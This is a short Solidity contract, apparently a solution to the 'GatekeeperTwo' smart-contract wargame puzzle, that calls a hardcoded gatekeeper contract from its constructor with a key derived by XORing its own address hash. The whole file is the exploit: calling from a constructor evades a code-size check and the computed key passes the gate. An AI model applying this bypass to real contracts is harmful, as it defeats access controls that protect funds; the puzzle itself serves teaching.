//SDPX-License-Identifier: MIT

pragma solidity 0.6.0;

contract TrespasserTwo {
  constructor() public {
    address gatekeeperTwo = 0xf7B57E0Da560cC970a5F418eC3d5FDcFB457836F;

    bytes8 _key = bytes8(
      (uint64(0) - 1) ^
        uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
    );

    (bool success, ) = gatekeeperTwo.call(
      abi.encodeWithSignature("enter(bytes8)", _key)
    );
    require(success, "Could not trespass.");
  }
}